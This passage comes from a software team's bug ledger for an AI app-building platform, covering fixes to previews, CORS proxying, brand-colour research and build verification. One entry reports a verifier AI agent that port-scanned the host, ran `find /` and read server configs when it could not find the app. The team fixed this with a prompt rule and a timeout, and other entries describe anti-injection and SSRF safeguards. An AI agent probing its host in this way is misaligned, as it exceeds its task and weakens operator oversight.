- **`monaco-cdn-csp-block`** (broken feature, operator 2026-07-14, live) - the file-editor dialog
  never initialized under the dashboard CSP: @monaco-editor/react's default loader pulls from
  cdn.jsdelivr.net, blocked by script-src 'self' ("Monaco initialization: error" + uncaught
  promise rejections in the console). Fixed by self-hosting the AMD tree from web/public/monaco
  (copy-monaco.mjs, predev/prebuild); the CSP was not widened.
- **`expected-absent-probe-console-noise`** (console hygiene, operator 2026-07-14, live) - every
  served-app load logged `GET /api/app-sso/me 401` (scaffold whoami) and, on tourless apps,
  `GET /api/demos/:appId 404` (panel teach probe) - "expected-absent" by design but console-visible
  on every load. Fixed with two additive always-200 probe routes (appSsoSession,
  demoAvailability - contract-tested) + repointed scaffold wiring and panel probe. Residual
  ACCEPTED: apps built BEFORE this change baked the old wiring and keep logging the /me 401, so
  the e2e benign-console allowlists for the 401 stay; the demos-404 allowlist entries were removed
  (the probe no longer 404s on any panel version served by a rebuilt api).
- **`preview-iframe-sandbox-warning`** (console hygiene, operator 2026-07-14, live) - Chrome
  warned "An iframe which has both allow-scripts and allow-same-origin... can escape its
  sandboxing" on every side-panel preview load (incl. each about:blank hot-reload hop). The
  sandbox attribute was removed (escapable as configured; see decisions 2026-07-14 for the
  isolation model + accepted top-navigation residual). Out of scope, not ours: the
  ObjectMultiplex "orphaned data" and MaxListenersExceededWarning lines in the same console
  capture come from the MetaMask extension's content script, not the product.
- **`suite-ledger-gate-crash-operator-run-gates`** (QA infra, found 2026-07-14 while running the
  gate) - `scripts/suite-ledger-run.mjs` threw `Unknown gate: operator-run C5` on the slice-named
  targetGates the operator run registered (commit ac1f3d3), so `npm run gate:ledger` AND
  `npm run e2e` crashed outright. Fixed: `gateIndex` maps any `operator-run*` gate to one shared
  post-G13 `OPERATOR-RUN` milestone (those drivers need the credentialed live stack and report
  as awaiting in the CI lane; they were live-verified during the operator run itself).
- **`suite-ledger-census-refusal-file-request`** (QA infra, found 2026-07-14 by the same gate
  run) - the unit census was red (disk 31 != ledger 30): commit 8996048 (BRIEF-9a) said
  "ledgered" but never added `refusal-file-request` to `frontend_unit.surviving`. Registered,
  with a census_note breadcrumb.

## Recently fixed - 2026-07-14 walkthrough-prep sweep (operator evidence pass)

- **`api-js-yaml-undeclared-dependency`** (dev-mode boot, 2026-07-14) - `api/` imports `js-yaml`
  (action-manifest parsing) but never declared it: at runtime it resolved ONLY as a transitive dep
  of **eslint** (a devDependency), so a production `npm ci --omit=dev` install would crash the API
  on import, and types came from an ambient shim (`api/src/automation/vendor.d.ts`) that tsc loads
  via `include` but the ts-node ESM loader does not (`files: false`) - making `EKOA_API_MODE=dev`
  die on boot with an unrenderable TS7016 diagnostic (`[Object: null prototype]`). This was the
  ledgered G8 action the shim itself prescribed. Fixed: `js-yaml` added to api dependencies,
  `@types/js-yaml` to devDependencies, shim deleted, and the api `dev` script switched to
  `ts-node/esm/transpile-only` (type checking stays with the `typecheck` gate; dev watch restarts
  no longer pay a whole-program check and are immune to the ambient-file-loading gap class).
- **`app-manifest-recipe-dsl-undocumented`** (discovery, 2026-07-14, live) - the app base ships
  skills for `ui_actions` (declaring-ui-actions) and tours (authoring-tours) but NONE for the
  `capabilities:` recipe DSL, so build agents GUESS the shape. Observed live on a fresh tarefas
  build: the agent flattened `store.query` (`{ op: store.query, field: ..., op: eq, ... }` - the
  comparison belongs under `where: { field, op, value }`), duplicating the `op` key; ONE invalid
  line fails the whole frontmatter YAML parse at activation, so the app lost BOTH its action
  manifest AND its tours (`actionManifestError` + `toursError`) - the assistant could neither
  operate nor teach the app, and the errors surface only in server logs (no operator UI). Fixed:
  (a) new base skill `api/assets/bases/app/skills/declaring-capabilities.md` documenting the EXACT
  recipe op shapes (source of truth: `api/src/automation/platform-primitives.ts`) with the
  store.query `where:` mistake called out; (b) the live app repaired through the product's own
  path (an admin patch run dictating the corrected line) - tour + 2 actions now served. Residual
  (minor, open): `actionManifestError`/`toursError` are invisible outside server logs; consider an
  operator-visible surface.
- **`app-custom-action-unregistered`** (discovery, 2026-07-14, live) - second instance of the
  agent-content class: the tarefas build declared `ui_actions: - id: tarefa-adicionar, kind: custom`
  but never registered `window.__ekoaApp.actions['tarefa-adicionar']` (the declaring-ui-actions
  contract), so the assistant's operate flow ALWAYS failed its second action ("Não foi possível
  executar a ação.") - observed on camera. No build-time check catches a declared custom id with no
  registration in the app source. Live app repaired via patch run (kind -> `toggle`, a declarative
  click, no registration needed). Residual (minor, open): readUiActions could WARN when a custom id
  has no `__ekoaApp.actions[` registration anywhere in frontend/src.
- **`edit-mode-preview-not-visible-in-page`** (UX, open, 2026-07-14, observed live) - after a
  patch run completes, the panel's preview phase shows only the sha diff; the RUNNING served-app
  page keeps executing the old bundle (nothing reloads it), and manually reloading to SEE the
  change destroys the pending approve/revert panel state (client-only), leaving no panel path to
  revert. The admin therefore decides from shas alone. Fast-follow candidates: an in-panel
  "recarregar a aplicação" affordance that persists the pending preview (e.g. sessionStorage), or
  a live-reload signal to the served page on activation (the dashboard preview already gets
  preview_reload). Sits beside the ledgered `h3-edit-mode-no-cancel` fast-follow. Also note: the
  post-restore dist rebuild is asynchronous - an immediate reload can race it.
- **`assistant-operate-turn-noise-citations`** (minor, open, 2026-07-14) - an operate-mode panel
  turn ("Adiciona uma tarefa...") rendered a Fontes block citing five irrelevant jurisprudência
  acórdãos (org grounding ran and cited for a non-question turn). Cosmetic but confusing; consider
  suppressing citations on do-mode turns whose grounding contributed nothing.
- **`panel-dead-tour-launcher`** (discovery, 2026-07-14, fixed in d172c2a) - teach mode offered
  "Iniciar tutorial guiado" unconditionally; on an app with no stored tour the player can only
  error ("an app with no tours simply has no teach path", authoring-tours). The panel now probes
  GET /api/demos/:appId once on mount (zero-token) and renders the launcher only when a tour
  exists. Asset rebuilt; the RUNNING api caches panel bytes in memory, so the live swap (and its
  live verification) lands on the next stack boot - the E2 driver covers it (its demos stub
  precedes navigation, so the probe is fulfilled).

- **`chat-refusal-affordance-unwired`** (discovery, 2026-07-14) - BRIEF 9a promised a refused
  build in the dashboard chat "converts into a pre-drafted build request routed to the org-admin
  - never a dead end", and diagram 03's H4 block + the change-requests store's `fileFromRefusal`
  action both claimed the feed - but NO component ever called it: a capability refusal
  (POST /jobs 403 `canBuildApps`/`canEditApps`) rendered as a plain red error with no way to file
  the pedido (code-behind-diagram drift; the served-app panel path was wired, the dashboard chat
  path was not). Fixed: `useAgentExecution` attaches the pre-drafted request
  (`metadata.refusal = { text, appId? }`) to the capability-refusal message, and the chat bubble
  renders "Pedir ao administrador" -> `fileFromRefusal` -> "Pedido enviado ao administrador."
  (`data-testid` chat-refusal-file/filed). Pinned by `web/__tests__/refusal-file-request.test.ts`
  (403+capability carries the payload incl. appId on follow-ups; 500 and capability-less 403 do
  not). Diagram 03 already depicted the flow - no diagram change needed.
- **`assistant-panel-e2e-stale-intro-assert`** (discovery, 2026-07-14) - the committed D2 driver
  `api/tests/e2e/assistant-panel.e2e.mjs` asserted the first-open lead contains "apresentar", but
  the shipped copy (AssistantPanel.jsx) says "mostrar ... ensinar ... operá-la": a re-run failed at
  step B on copy drift, not behavior. Fixed the assertion to the shipped copy ('mostrar').

## Recently fixed - 2026-07-13 preview probe CORS duplicate header (operator)

- **`F-2026-07-13-proxy-duplicate-acao`** (operator-reported, 2026-07-13) - in dev, the preview
  probe's `HEAD /apps/<slug>/` from the dashboard origin failed CORS on EVERY request:
  `The 'Access-Control-Allow-Origin' header contains multiple values '*, http://localhost:3000'`
  (`net::ERR_FAILED` despite a 200), so `probePreviewDocument` classified every served app as
  `transient` and the panel's probe-gated first render churned through its retry budget. Root
  cause: both dev CORS proxies (`.claude/skills/run-ekoa-code/driver.mjs` and its verbatim copy in
  `api/tests/journeys/boot-b.mjs`) merged response headers with
  `{ ...proxyRes.headers, ...corsHeaders(req) }` - Node lowercases upstream header names while
  `corsHeaders()` uses mixed case, so on planes where the api sets its OWN CORS header
  (`/apps/*` and design tokens send `Access-Control-Allow-Origin: *` - `serving.ts`,
  `design-tokens.ts`) the spread kept BOTH keys and the wire carried two ACAO values, which
  browsers reject outright. Dev-only (prod is same-origin, no proxy). Fixed in both files:
  upstream-wins per-header merge (`mergeResponseHeaders`) - the proxy only injects the CORS
  headers upstream did not already set, so `/apps/*` answers a single `ACAO: *` exactly as
  `web/lib/preview-probe.ts` documents, and `/api/*` keeps the reflected-origin set. Verified
  live through a restarted boot-b stack: `/apps/legal-agenda-reservas/` ACAO count 1 (`*`),
  `/health` reflected origin single-valued, OPTIONS preflight unchanged.

## Recently fixed - 2026-07-12 preview "proxy error" (operator)

- **`F-2026-07-12-preview-502`** (operator-reported, 2026-07-12) - during a build, the side-panel
  preview iframe displayed a raw `proxy error` body and stayed there (screenshot: 502 on the
  `/apps/<id>/?token=` document request while adjacent `/api/v1/billing/usage` calls returned 200).
  Two stacked defects:
  1. **Dev-harness proxy transient** (root cause of THIS 502): the run-ekoa-code driver's CORS
     reverse proxy (`.claude/skills/run-ekoa-code/driver.mjs`) forwarded upstream requests over the
     Node 20 global agent (keep-alive pooled, server closes idles at its default 5s
     `keepAliveTimeout`) and answered ANY pre-response upstream socket error with a bare 502
     `proxy error` - silently (no log), so the exact errno of the operator's occurrence (2 of 265
     requests) is unrecoverable. Fixed: fresh upstream connection per request
     (`http.Agent({ keepAlive: false })` - loopback, sub-ms), one replay for bodyless idempotent
     methods (GET/HEAD) failing before a response, upstream errors logged with method/path/errno,
     and a mid-stream failure destroys the response instead of appending garbage. Forensics note:
     the classic close-vs-reuse race would NOT reproduce in 365 timed attempts against Node 20
     (agent honors the server's Keep-Alive hint), so the residual trigger class is broader than
     that race - the fix covers the class, and the new logging captures any recurrence.
  2. **Preview panel could not recover** (product gap, any 5xx source incl. a prod edge blip): an
     iframe NEVER fires its error event for an HTTP error response - it renders the error body and
     fires `load` - so `side-panel.tsx`'s retry machinery never engaged and the raw body stuck
     until a manual refresh. Fixed: `web/lib/preview-probe.ts` classifies the document plane via a
     HEAD probe (`ok` 2xx / `transient` network+5xx / `hard` other); the panel now gates the first
     iframe render on the probe (polls at the existing 500ms/30s bounds), re-probes on every iframe
     `load`, routes `transient` into the existing bounded retry, restores the retry budget on a
     verified-ok load, and renders `hard` pages (410 revoked) as-is. Manual refresh polling unified
     on the same classification (and now probes the tokened URL the iframe actually loads).
  Accepted residual: a blip that hits ONLY the iframe's GET while the adjacent HEAD probes pass is
  undetectable cross-origin without a new parent<->iframe liveness protocol on the byte-compat
  injection plane (the demo bridge stays dormant until `demo.init` by design) - disproportionate;
  revisit only if it recurs behind the fixed proxy/edge. Tests:
  `web/__tests__/lib/preview-probe.test.ts` (classification),
  `web/__tests__/components/side-panel-preview-recovery.test.tsx` (wiring: probe-gated first
  render, 410 renders as-is, on-load transient -> retry -> recovery); both fail against the
  pre-fix behavior. Live-verified 2026-07-12: stack restarted on the fixed driver, real-UI login,
  /artifacts + served `legal-nucleo` render through the proxy, 16/16 doc-plane requests across
  5s keep-alive boundaries clean.

## Recently fixed - 2026-07-12 brand research colors (operator round 3)

- **`brand-colors-fake-teal`** (operator-reported, 2026-07-12) - research on
  mariliasantoscabral.webnode.pt showed primary `#0d9488` (teal-600, the OLD platform default) on a
  navy/white site with no teal anywhere. Root-cause forensics (live DB + job records + a live
  extraction probe) proved the teal never existed in the pipeline, the model output, or the org
  record: it was the branding page's HARDCODED display fallbacks (`#0d9488`/`#1e293b`) rendered
  whenever `org.branding` lacked colors - indistinguishable from a research result, and
  `handleSaveBranding` would persist them verbatim on Guardar. Fixed: unset colors are `null` state
  end-to-end (explicit "Não definida" swatch/placeholder, neutral preview placeholders), Save OMITS
  unset colors, and the exact pair appears nowhere. Tests: `web/e2e/branding-colors.spec.ts`.
- **`brand-research-silent-no-color`** (same run) - the research flow structurally could not produce
  a color for this site yet reported success: the grounded snapshot contained ONLY grayscale hexes,
  the model complied, `sanitizeBrandColors` nulled them, the patch dropped the nulls, and the job
  completed `brandingApplied:true` with no signal (the old cortex NO_PRIMARY_COLOR fail-loud guard
  was never ported - color-filter.ts's own comment referenced a "no usable primary guard" that did
  not exist). Fixed as partial-apply-with-warning: the job result + complete event + `jobView` carry
  `colorsApplied` and `warnings: [NO_PRIMARY_COLOR]`; the web shows an amber "defina-as manualmente"
  banner/toast instead of green success. Tests: `api/tests/contract/branding.test.ts` (fail-loud
  monochrome case), shared `Job` schema extended.
- **`brand-colors-image-only-blind`** (same run, the actual extraction gap) - the firm's navy lives
  ONLY as pixels in the hero JPEG; the rendered walker samples computed styles, so `paintedHexes`
  came back empty, the Webnode builder scrub then intersected the CSS candidates against that empty
  set and wiped all 8, leaving the model four grayscale hexes. Fixed with a screenshot-PIXEL
  quantization fallback in `rendered-candidates.ts` (fires only when nothing non-neutral paints;
  in-page canvas quantization of the Playwright screenshot - a data: image, so no cross-origin
  taint), surfaced as an explicitly low-confidence "Cores amostradas dos píxeis" prompt section with
  a neutral-ban rule, deliberately exempt from the brandFit floor (the desaturated navy ~0.26 is the
  point). Live-verified against the real site: research now persists primary `#374559` (the actual
  hero navy) and no neutrals. Tests: `api/tests/services/branding/rendered-candidates.test.ts`
  (`screenshotClustersToCandidates`), `snapshot.test.ts` (pixel section + rules).
- **`brand-colors-no-membership-guard`** (found during the fix, latent in old cortex too) - the
  "every returned hex must appear literally in a candidate list" rule was prompt-only; a
  hallucinated saturated color would have merged unchecked. Fixed: `collectAllowedHexes` gathers the
  snapshot evidence and the apply-step NULLS any returned color outside it (grounded path only).
  Tests: `api/tests/contract/branding.test.ts` (out-of-snapshot teal dropped),
  `snapshot.test.ts` (`collectAllowedHexes`).
- **`sanitize-accent-gap`** (same run) - `sanitizeBrandColors` never checked `accentColor`, so gray
  `#9d9d9d` persisted as the org accent; and the promotion swap PARKED the demoted gray in the
  accent slot. Fixed: a grayscale accent is nulled last (no slot ever persists a neutral). Tests:
  `api/tests/services/branding/color-filter.test.ts`.
- **`branding-save-wholesale-wipe`** (found during the fix) - `saveBrandingHandler` passed the
  client's 4-field branding object straight to `updateOrg`, which replaces top-level keys wholesale:
  every dashboard Guardar silently WIPED `designSystem`/`visualVibe`/researched fields. Fixed: the
  handler merges onto existing branding (same semantics as the research apply-step). Test:
  `api/tests/contract/branding.test.ts` (save-merge case).
- **`accent-picker-secondary-binding`** (same run) - the "Cor de Destaque" picker was bound to
  `secondaryColor`, so the persisted `accentColor` was never displayed and Save wrote the fallback
  slate into `secondaryColor` under an accent label. Fixed: the accent picker binds `accentColor`.
  Test: `web/e2e/branding-colors.spec.ts` (accent stays unset when only primary is saved).
- **`branding-page-stale-until-reload`** (operator-reported, 2026-07-12 follow-up: "had to refresh
  to see the changes on the brand area") - the branding page re-syncs its local editor state only
  when the `${company.id}_${company.updatedAt}` fingerprint changes, but `orgView` never returned
  `updatedAt` and nothing stamped it, so the fingerprint NEVER changed after mount: the
  `branding_updated` notification correctly refetched the company (round-2 fix), the store updated,
  and the page kept rendering stale colors/name until a reload remounted it. Fixed server-side:
  `updateOrg` stamps `updatedAt` on every org patch, `orgView` + shared `OrgConfig` expose it.
  Live-verified: page open on the Marca tab, research fired via API, primary + company name updated
  in place with zero navigation. Test: `api/tests/contract/branding.test.ts` (updatedAt present +
  changes across saves + GET /org parity).
- **`founder-name-never-updated`** (operator-visible in the same screenshot) - "Founder" is the
  seedAdmin bootstrap displayName; `BrandResearchResult` had no `companyName` field, so research
  could never replace it (old cortex wrote displayName from the extracted companyName). Fixed:
  `companyName` added to the shared schema + both system prompts, applied to `org.displayName`
  (never merged into branding, via `RESEARCH_META_KEYS`). Live-verified: displayName became
  "Marília Santos Cabral". Test: `api/tests/contract/branding.test.ts` (companyName case).

## Recently fixed - 2026-07-11 operator round 2 (build surface + verify + logo)

- **`verify-runner-portscan-hang`** (operator-reported, 2026-07-11) - a simple flyer build sat in
  `verifying` with NO output for 13+ minutes, then surfaced a half-redacted raw SDK error ("Agente
  EKOA Code returned an error result: Reached maximum number of turns (15)"). Root causes, from the
  verifier's own transcript: (1) `build.ts` passed the artifact-relative `appUrl` (`/apps/<id>/`,
  no origin) verbatim into the verify prompt, so the agent PORT-SCANNED the host (`:80 :3000 :8080
  :5173 :7080-7090`, `find /`, old-ekoa nginx configs) hunting for the app it could never find;
  (2) the build wall-clock/inactivity timers are cleared BEFORE verify, so nothing bounded it;
  (3) the raw error string reached the user chat. Fixed in `apps/verify-runner.ts`: the prompt gets
  an ABSOLUTE loopback URL (`resolveVerifyUrl` - the API serves `/apps/*` itself), a hard
  `AbortSignal.timeout(verifyWallClockMs)` (5 min default, env-tunable) as the REAL bound, an
  explicit no-scavenger-hunt rule (URL dead → FAIL immediately, never search the host), a
  proportionate-effort rule (static flyer → quick pass), live narration forwarded through the new
  job thinking channel (`onProgress` seam), and PT-generic user-facing notes (raw errors go to the
  server log only). Turn ceilings raised per operator directive ("must never stop users mid-task"):
  verify 15→60, build 100→500, chat 30→60 - backstops, not bounds. A verify note no longer REPLACES
  the agent's completion summary (it's appended). Tests: `api/tests/apps/verify-runner.test.ts`.
- **`build-chat-raw-internals`** (operator-reported, 2026-07-11) - the build transcript showed raw
  tool calls (Bash command lines, Read/Write with absolute sandbox paths, tool results incl. "File
  does not exist... your current working directory is /Users/..."), "Routing: EXPERT - first build",
  commentary bubbles split MID-WORD ("...construir s" / "obre a estrutura..."), and the final
  summary named `window.__ekoa.exportPdf`. Root causes: `build.ts` flattened the chokepoint's
  thinking/text channels into `text_chunk` (chat.ts had the thinking channel; build never did);
  `useJobStream` flushed the live buffer into a permanent message on EVERY tool_event (the mid-word
  chops) and rendered raw tool traffic + the routing decision into the user-visible feed. Fixed:
  `JobEvent` gained `thinking_chunk`; build routes commentary through MarkerProcessor +
  StreamingIdentityRedactor into the collapsible thinking UI (same as chat); the activity feed shows
  friendly white-labelled one-liners with project-relative paths (never commands/results/routing);
  `BUILD_SYSTEM_PROMPT` forbids internal API/machinery names in the final user-facing message.
- **`build-no-live-preview-no-files`** (operator-reported, 2026-07-11) - preview stayed empty during
  (and after) the build and the files area showed nothing, even though `prepareFirstBuild` had
  ALREADY built + registered + served the scaffold ("register it so the preview is live before the
  agent runs" - the last mile was never wired: nothing emitted `preview_reload`, and the client
  learned the artifactId only at `complete`). Fixed: new `JobEvent` `artifact`
  `{artifactId, appUrl, slug}` emitted right after prep/resolve → the preview iframe + REAL file
  tree (GET `/artifacts/:id/files`, the scaffold/template files) show from second zero; the esbuild
  watcher's `onRebuild` now fires `sink.previewReload()` so the iframe follows the agent's writes
  live (follow-up builds get a watcher too - they previously ran without one); the Files tab is fed
  from the server list (source of truth) with live +/M/D badges, and file paths are project-relative
  - which also fixes the Monaco editor dialog (it exists and works; it was sending
  `sandboxes/...`-prefixed paths that the path-confined API rejected). Latent bug fixed on the way:
  follow-up completion blanked the artifact's slug/appUrl (`resolveFollowUp` now returns them).
- **`brand-logo-wrong-image`** (operator-reported, 2026-07-11) - "not the logo at all": the logo
  picker chose a 380KB touch-icon (`/brand-assets/01d6df7c73d6.png`) because selection was
  source-name heuristics only (favicons/og-image) with no eyes on the rendered page - the OLD ekoa
  worked better because its research agent DROVE A BROWSER and picked the header logo by sight.
  Restored that ability tool-lessly (§5.6.4 intact): (1) `rendered-candidates.ts` now harvests logo
  candidates from the RENDERED DOM (header/nav imgs, inline `<svg>` logos - stored as sanitized
  local svg assets - and logo-classed background images), scored by placement (header, top-left,
  home-link, logo attrs, aspect ratio); (2) new top trust tier `rendered-header` beats
  design-system/favicon sources, JPEG photos demoted within tiers; (3) ONE FAST vision one-shot
  (`logo-vision.ts`) compares the downloaded candidates against the header-strip screenshot and can
  override the heuristic pick ("qual é o logótipo visível no cabeçalho?"). Tests extended in
  `api/tests/services/branding/brand-assets.test.ts`.
- **`brand-stale-until-refresh`** (operator-reported, 2026-07-11) - the dashboard kept the old
  brand until a manual page reload. The Marca page refetches on its own job stream, but the header
  logo/theme only read the company store on first load. Fixed with a `branding_updated`
  notification (NotificationEvent) emitted when research applies branding; the header listens on
  the global notifications stream (same pattern as `usage_updated`) and refetches the company
  config - live brand refresh, no reload.
- **`verify-blocked-by-shareability-gate`** (found during the live re-verify of the fix above) -
  with the URL fixed, the verifier reached the app in 17 SECONDS but got the §7.7 "Link já não
  disponível" page: a draft, non-shareable artifact's document is owner-gated, and the verify
  agent carries no auth (and must NEVER carry a user JWT in an agent transcript - it would
  authenticate on every API route). Fixed with a PURPOSE-SCOPED preview token
  (`services/preview-token.ts`: HMAC capability `pv1.<artifactId>.<exp>.<mac>`, not a JWT,
  grants viewing ONE artifact's served document for the verify window): verify-runner appends it
  to the URL; serving.ts accepts it in the owner-bypass ahead of the user-JWT path. Verdict notes
  are now requested in PT (they surface to the end user). Tests: preview-token expiry/tamper +
  resolveVerifyUrl token cases in `api/tests/apps/verify-runner.test.ts`.
- **`app-pdf-endpoint-never-mounted`** (CAUGHT BY THE NOW-WORKING VERIFIER, live 2026-07-11:
  "o botão 'Descarregar PDF' não funciona — o servidor retorna um erro 404") - the injected
  `window.__ekoa.exportPdf` client was carried in the port but its endpoint `POST /api/app-pdf`
  (and the `/artifact-pdfs` static mount) never were: EVERY in-app document export 404'd since
  rc-1. Ported from old cortex into `apps/pdf.ts`: `renderAppDocumentPdf` (page JS disabled,
  subresource allowlist blocking private ranges/metadata, injected `<base>`, embedded print
  reset, @page-aware margins) + `appPdfRouter` (X-Ekoa-App-Id scoping, html required, 4MB cap)
  + both mounts in server.ts. Contract test: `api/tests/contract/app-pdf.test.ts`. Second-order
  fix in the same class: agent-written `@import '/api/design-tokens.css'` failed the whole
  esbuild bundle ("could not resolve") - server-absolute paths are now treated as runtime URLs
  (CSS externals / JS stubs) in builder.ts's resolver, and the coding-agent content now says the
  tokens are auto-linked in index.html and must never be imported.
- **`brand-consent-overlay-polluted-vision`** (found during the live re-verify) - plmj.com's
  Cookiebot overlay covered the header strip, so the logo-vision ground truth showed a cookie
  banner and the rendered harvest scored a team-PORTRAIT carousel into the top tier (position +
  aspect alone). Fixed: `consent-chrome.ts` (shared vendor-token list + in-page removal) runs
  before EVERY rendered pass (colours, logo harvest, header shot, visual-vibe screenshots);
  harvest candidates now require a STRUCTURAL logo signal (logo attrs / header-nav / home-link)
  to qualify, and photo JPEGs are score-penalized. Re-verified live: the vision gate then
  correctly overrode dembrandt's white-on-white candidate to the REAL PLMJ wordmark, and the
  header logo swapped in live (`navigations: 1`, no reload).
- **`brand-assets-url-keyed-cache-staleness`** - stored assets were keyed by md5(source URL), so
  a re-research whose logo changed at the same URL kept the same `/brand-assets/<hash>` path and
  every browser served its stale cached copy. Now keyed by md5(CONTENT).
- **`dev-harness-30s-health-window`** - `scripts/dev-api.mjs` killed healthy API boots at 30s while
  a cold boot registering ~200 featured apps takes ~90s. Now 120s default (`DEV_API_HEALTH_TIMEOUT_MS`
  override); the run-skill driver's API window raised to 180s.

## Recently fixed - 2026-07-11 stabilization run

- **`brand-research-site-blind`** (operator-reported, 2026-07-11) - brand research "saved nothing
  from the site": the agent was TOOL-LESS *and* model-knowledge-only, so it never touched the
  target website, never saved a logo, and never produced a design system - it emitted a plausible
  palette from memory and the job's `summary`/`confidence` were the only real output. Fixed by
  porting the REAL cortex pipeline as deterministic SERVER-SIDE services (`api/src/services/branding/`):
  `fetchSiteContext` (HTML + linked-CSS scrape: title/meta/generator, CSS colour + font candidates),
  `fetchRenderedCandidates` (headless-Chromium area-weighted painted colours + fonts),
  `fetchDesignSystem` (the `dembrandt` 0.23 CLI: confidence-scored palette, CSS variables, typography,
  spacing, radii, shadows, button styles, frameworks), `fetchVisualVibe` (hero/mid/footer screenshots
  → vision one-shot → mood/shape/density/texture/hero), plus website-builder chrome detection/scrub so
  a Webnode/Wix promo stripe never masquerades as the brand. The agent STAYS tool-less (§5.6.4
  anti-injection): all site access is server code, the model receives a server-built snapshot and
  returns constrained JSON grounded "usa APENAS a informação do snapshot". The orchestrator
  (`agents/brand-research.ts`) now: fetch site-context → (parallel) rendered + dembrandt + vibe →
  grounded `runOneShot` → resolve + STORE a real logo file under `/brand-assets/<file>` (SSRF-guarded
  download, content-type + size cap) → merge colours/fonts/tone/instructions + `designSystem` +
  `visualVibe` + `logo` onto `org.branding`. Site unreachable → honest degradation to the
  knowledge-only prompt, noted on the job (`siteReachable: false`). All server fetches of the
  user-supplied URL go through the SSRF guard (new `guardedFetchFollow` re-validates each redirect
  hop); the dembrandt URL is guard-validated BEFORE the subprocess spawns. `shared/OrgBranding`
  gained optional typed `designSystem` (StoredDesignSystem) + `visualVibe` fields (the dashboard
  Design System tab already reads them). Covered by 6 unit suites under
  `api/tests/services/branding/` + the extended `api/tests/contract/branding.test.ts` (reachable-site
  run merges colours + designSystem + visualVibe + a stored logo; unreachable degrades to knowledge).
  Decision logged in `docs/decisions.md`. LIVE-VERIFIED 2026-07-11 against plmj.com: real logo stored
  and served at `/brand-assets/...`, real brand colours (`#110088` navy + `#a90707` red), real fonts
  (Domaine Display + GT America), a populated Design System tab (palette + typography + visual vibe),
  visible in the Marca preview. Three follow-up fixes made during that live verification:
  (a) **vibe screenshots exceeded the 32MB provider request cap** ("Request too large") - three
  viewport PNGs of a photo-heavy site are multi-MB base64; switched the vibe captures to JPEG q60
  (`api/src/services/branding/visual-vibe.ts`), which keeps each shot in the low-hundreds-of-KB.
  (b) **cookie-consent vendor chrome leaked into the palette** - dembrandt colours whose sources were
  all `cybotcookiebotdialog...`/OneTrust/etc. were surviving; added a builder-independent
  consent-chrome source filter in `filterDesignSystemChrome`, AND made `scrubBuilderChrome` always run
  the design-system filter (it previously early-returned when NO site-builder was detected, so custom
  sites like plmj.com were never scrubbed). (c) A `manifest:theme_color` white legitimately survives
  (mixed owner source) - by design. Covered by new cases in the design-system + snapshot suites.
- **`gateway-empty-text-block-cache-control`** (vision-discovered, walkthrough 2026-07-11) - the
  Agent SDK intermittently appends an EMPTY text block that still carries a `cache_control`
  breakpoint on multi-turn chat runs (reproduced deterministically on the integration-build
  handoff two-turn handshake). The OAuth beta endpoint 400s
  `messages.N.content.M.text: cache_control cannot be set for empty text blocks`, killing the whole
  turn - so the integration-builder generation failed every time while plain builds and single-turn
  chat were unaffected. Fixed at the egress chokepoint (`proxyGatewayMessages`, the last place we
  control before the provider): `stripEmptyTextBlocks` scrubs empty text blocks out of the
  forwarded `messages`/`system`, guarded so a message is never left with an empty `content: []`.
  Covered by `api/tests/llm/gateway-payload-allowlist.test.ts` (3 cases: scrub-alongside-real,
  never-empty-the-array, plain-string-passthrough). Live-verified: the same handoff that 400'd now
  reaches `package-ready` with a Save button. Decision logged in `docs/decisions.md`.
- **`run-activity-bar-word-wrap`** (vision-discovered, walkthrough 2026-07-11) - the automation
  rehearsal activity bar rendered the fixer commentary one-word-per-line: `Headline`/`Subline`/
  `ResolutionLine` sat as siblings in the flex-row `BarWrapper`, so a long failure message squeezed
  the headline to content-width. Fixed by wrapping the text block in a `min-w-0 flex-1` column in
  the `fixing-step` and `running-step` branches (`web/components/automations/run-activity-bar.tsx`).
  Evidence: walkthrough `stabilization-verification/2026-07-11_11-26-17` (pre-fix state on camera).
- **`chat-turn-no-progress-indicator`** (vision-discovered, walkthrough 2026-07-11) - plain chat
  turns showed NO indicator between send and the first streamed chunk (the whole knowledge-search
  phase was a blank screen): the progress indicator required `sessionJob`, which only build
  sessions have. Fixed: `isExecuting && (sessionJob || !isBuildSession)`
  (`web/components/builder/chat-panel.tsx`), so chat turns show "A pensar..." + elapsed time
  immediately. Evidence: walkthrough `2026-07-11_11-44-28` (blank) vs `2026-07-11_11-49-20` (fixed).
- **`automation-step-events-thin`** (operator-reported, 2026-07-11) - a regression vs old cortex: the
  automation run's `step` SSE event dropped everything but `{runId, stepIndex, status}`, so per-step
  screenshots captured + persisted server-side (`writeStepScreenshot`) never reached the run viewer,
  and there was NO `express.static('/automation-screenshots', ...)` mount - even the already-emitted
  `pause_for_user` screenshot URL 404'd. Fixed by (a) extending the shared `AutomationRunEvent.step`
  member + `RunRecord` with the optional enrichment (`stepId/tier/error/errorDetails/screenshotUrl/
  output/durationMs`; `errorDetails` is the executor's already-redacted+bounded integration/api
  request-response that lights up the live IntegrationErrorPanel; per-step `RunStepRecord` with a
  served `screenshotUrl`), (b) a pure, unit-tested
  mapper `automationStepEventPayload` (api/src/automation/run-events.ts) the composition-root emitter
  now forwards, (c) mounting `/automation-screenshots` on `automationRunsRoot()` mirroring the
  `/artifact-screenshots` precedent, and (d) serializing steps (with `screenshotUrl`) in `toWireRun`
  so `GET /runs/:id` + the Histórico drill-in render thumbnails without knowing the disk layout. The
  disk-path -> served-URL map lives in ONE helper (`screenshotUrlFromPath`). Covered by
  `api/tests/automation/run-events.test.ts`, `api/tests/contract/automation-screenshots.test.ts`, and
  shared `contract.test.ts` (thin+enriched parse). Decision logged in `docs/decisions.md`. Remaining
  for live verification: a real automation run driven end-to-end (operator session).
- **`automation-vision-empty-screenshot`** (operator-reported, 2026-07-11) - a browser/verify step
  could hand the vision tier an EMPTY screenshot (a `page.screenshot()` that failed on the local
  session, or a daemon observation envelope missing `screenshotB64`); the model then answered
  `confidence:'low'` and the engine refused ("No screenshot was provided"), burning the fixer budget
  blind and crippling self-recovery. Fixed with a guard (`screenshotForVision` in engine.ts): on an
  empty capture, force ONE fresh `observe()` and re-read; if still empty, fail the step RECOVERABLE
  with a user-grade PT message ("captura de ecrã indisponível - o passo não pode ser resolvido
  visualmente") so the fixer/pause machinery handles it - the model is never asked to work blind.
  Belt-and-braces: `LocalBrowserSession.capture()` now retries the screenshot once after a settle and
  only keeps a NON-EMPTY capture; `resolvePlaywrightAction`/`verifyOutcome` throw on an empty image
  (documents the invariant). Covered by two `api/tests/automation/engine.test.ts` cases (browser +
